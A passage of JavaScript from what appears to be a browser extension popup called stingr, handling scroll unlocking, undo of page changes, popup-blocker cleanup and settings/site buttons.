        markInjection('blocker');
      }
    }).catch(err => {
      statusEl.textContent = 'Error: ' + err.message;
    });
  });

  // ── Unlock scroll only ──
  el.querySelector('#unblock-scroll').addEventListener('click', () => {
    executeOnActiveTab(() => {
      if (!window.__stingrUnblock) window.__stingrUnblock = { removed: [], modified: [] };

      let fixed = false;
      ['body', 'documentElement'].forEach(target => {
        const el = document[target];
        const style = getComputedStyle(el);
        if (style.overflow === 'hidden' || style.overflowY === 'hidden') {
          window.__stingrUnblock.modified.push({ el: el, prop: 'overflow', value: el.style.overflow });
          window.__stingrUnblock.modified.push({ el: el, prop: 'overflowY', value: el.style.overflowY });
          el.style.overflow = 'auto';
          el.style.overflowY = 'auto';
          fixed = true;
        }
        // Also remove position:fixed on body (some sites use this to lock scroll)
        if (target === 'body' && style.position === 'fixed') {
          window.__stingrUnblock.modified.push({ el: el, prop: 'position', value: el.style.position });
          window.__stingrUnblock.modified.push({ el: el, prop: 'top', value: el.style.top });
          window.__stingrUnblock.modified.push({ el: el, prop: 'width', value: el.style.width });
          el.style.position = '';
          el.style.top = '';
          el.style.width = '';
          fixed = true;
        }
      });

      return fixed ? 'Scroll unlocked' : 'Scroll was not locked';
    }).then(result => {
      statusEl.textContent = result || 'Done';
    }).catch(err => {
      statusEl.textContent = 'Error: ' + err.message;
    });
  });

  // ── Undo all changes ──
  el.querySelector('#unblock-undo').addEventListener('click', () => {
    executeOnActiveTab(() => {
      if (!window.__stingrUnblock) return 'Nothing to undo';

      let count = 0;

      // Restore removed elements
      for (const item of window.__stingrUnblock.removed) {
        try {
          item.el.style.display = item.display || '';
          count++;
        } catch (e) {}
      }

      // Restore modified properties
      for (const item of window.__stingrUnblock.modified) {
        try {
          item.el.style[item.prop] = item.value || '';
          count++;
        } catch (e) {}
      }

      window.__stingrUnblock = { removed: [], modified: [] };

      // Clean up picker if active
      if (window.__stingrPicker) {
        window.__stingrPicker.cleanup();
      }

      // Clean up blocker if active
      if (window.__stingrBlocker) {
        window.__stingrBlocker.observer.disconnect();
        const badge = document.getElementById('stingr-blocker-badge');
        if (badge) badge.remove();
        delete window.__stingrBlocker;
      }

      return count > 0 ? 'Restored ' + count + ' change(s)' : 'Nothing to undo';
    }).then(result => {
      statusEl.textContent = result || 'Done';
      logEl.innerHTML = '';
      clearInjection('picker');
      clearInjection('blocker');
      const pickBtn = el.querySelector('#unblock-pick');
      pickBtn.classList.remove('btn-active');
      pickBtn.classList.add('btn-primary');
      pickBtn.textContent = 'Pick & Remove';
      const blockBtn = el.querySelector('#unblock-block');
      blockBtn.classList.remove('btn-active');
      blockBtn.classList.add('btn-primary');
      blockBtn.textContent = 'Block New Popups';
    }).catch(err => {
      statusEl.textContent = 'Error: ' + err.message;
    });
  });
}

// ── Init ────────────────────────────────────────────────────────────────────

function init() {
  renderTabs();
  renderCategory(activeCategory);
  initResize();

  // Kill button
  document.getElementById('btn-kill').addEventListener('click', killAllInjections);

  // Check if anything is already active on the page
  executeOnActiveTab(() => {
    const has = [];
    if (document.getElementById('stingr-outline-style')) has.push('outline');
    if (window.__stingrRuler) has.push('ruler');
    if (window.__stingrPicker) has.push('picker');
    if (window.__stingrBlocker) has.push('blocker');
    return has;
  }).then(results => {
    const active = results && results[0] && results[0].result;
    if (active && active.length) {
      active.forEach(name => activeInjections.add(name));
      updateKillButton();
    }
  }).catch(() => {});

  document.getElementById('btn-settings').addEventListener('click', () => {
    chrome.tabs ? chrome.tabs.create({ url: 'settings.html' }) : window.open('settings.html');
  });

  document.getElementById('btn-open-site').addEventListener('click', () => {
    chrome.tabs ? chrome.tabs.create({ url: 'https://stingr.dev' }) : window.open('https://stingr.dev');
  });
}

init();
